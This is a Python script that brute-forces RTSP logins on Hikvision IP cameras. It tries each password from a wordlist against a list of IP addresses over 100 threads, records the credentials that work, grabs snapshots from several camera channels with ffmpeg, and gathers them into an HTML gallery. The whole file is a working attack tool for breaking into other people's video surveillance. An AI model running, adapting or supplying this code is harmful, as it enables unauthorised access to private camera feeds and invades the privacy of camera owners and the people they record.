import os
import time
import datetime
import socket
import platform
import sys
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Back, Style


def rtspbrute(ip1):
	log=open("logs",'r')
	if ip1 not in log:
		flag=0
		ip1 = ip1[:-1]
		os.system("mkdir -p Hikvision/%s 2> /dev/null"%(str(ip1).strip()))
		dat=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
		os.system("mkdir Hikvision/%s/%s 2>/dev/null" %(ip1.strip(),dat.strip()))
		for passw in passread:
			chann=1
			passw = passw[:-1]
			print Fore.YELLOW+"\nRunning '%s' with password '%s'\n" %(str(ip1).strip(), str(passw))
			os.system("ffmpeg -v quiet -stimeout 7000000 -rtsp_transport tcp -y -i rtsp://admin:%s@%s:554/Streaming/Channels/101/ -ss 00:00:01.50 -vframes 1 Hikvision/%s/%s_temp.jpg " %(str(passw).strip(),str(ip1).strip(),str(ip1).strip(),ip1.strip()))
			if os.path.exists("Hikvision/%s/%s_temp.jpg" %(str(ip1).strip(),str(ip1).strip())):
				print Fore.GREEN + "Found Access of %s with password %s" %(str(ip1).strip(), str(passw))
				print(Style.RESET_ALL)
				access = open("hik-access-list","a")
				print >> access, ("rtsp://admin:%s@%s:554/Streaming/Channels/101/" %(str(passw),str(ip1).strip()))
				access.close()
				log = open("logs","a")
				print >> log, (str(ip1))
				flag=1
				while chann<=3:
					print "Trying to take screenshot of Channel No. "+str(chann)
					os.system("ffmpeg -v quiet -stimeout 7000000 -rtsp_transport tcp -y -i rtsp://admin:%s@%s:554/Streaming/Channels/%s01/ -ss 00:00:01.50 -vframes 1 Hikvision/%s/%s/%s_%s.jpg " %(str(passw).strip(),str(ip1).strip(),str(chann),str(ip1).strip(),str(dat).strip(),ip1.strip(),str(chann)) )
					chann=chann+1
			if flag == 1:
				break		
	return 1

if __name__ == "__main__":
	iplist = sys.argv[1]	
	f = open(iplist,"r")
	ip = f.readlines()
	passlist = sys.argv[2]
	password = open(passlist,"r")
	passread = password.readlines()
	access = open("hik-access-list","w")
	access.close()
	pool = ThreadPool(100)
	results = pool.map(rtspbrute, ip)		
	pool.close() 
	pool.join()
	os.system("find Hikvision/ -type d -empty -delete")
	os.system("python pics-viewer.py Hikvision")
	os.system("mv index.html Hikvision.html")
	print Fore.CYAN+"\n\nFINISHED\n"
